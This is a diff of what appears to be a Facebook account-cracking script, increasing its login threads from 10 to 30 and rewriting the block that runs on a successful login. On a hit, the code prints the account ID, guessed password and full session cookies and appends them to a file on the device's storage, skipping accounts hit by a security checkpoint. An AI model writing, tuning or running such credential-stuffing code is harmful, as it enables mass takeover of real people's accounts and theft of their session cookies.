@@ -116,7 +116,7 @@ def main():
         fb = "free"
     else:
         fb = "m"
-    with ThreadPool(max_workers=10) as update:
+    with ThreadPool(max_workers=30) as update:
     	
     	
         clear()
@@ -183,14 +183,13 @@ def host(uid, pwx, meth, fb):
             session.post(url=url, data=info, headers=had)
             heron_brand = session.cookies.get_dict().keys()
             if "c_user" in heron_brand:
-                    coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
-                    xx = coki.split("c_user=")[1]
-                    xd = xx[:15].replace(";", "  ")
-                    
-                    print(f"\r\r[SHADID-OK] {xd} <> {ps}\n[Cookies]{coki}")  
-                    open("/sdcard/SHADID-OK.txt", "a").write(xd + "|" + ps + "|" + coki + "\n")
-                    oks.append(xd)
-                    break
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                xx=coki.split("c_user=")[1]
+                xd=xx[:15]
+                print(f"\r\r[SHADID-OK] {xd} <> {ps}\n[Cookies]{coki}")
+                open("/sdcard/SD-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
+                oks.append(xd)
+                break
                     
             elif "checkpoint" in heron_brand:
                 pass
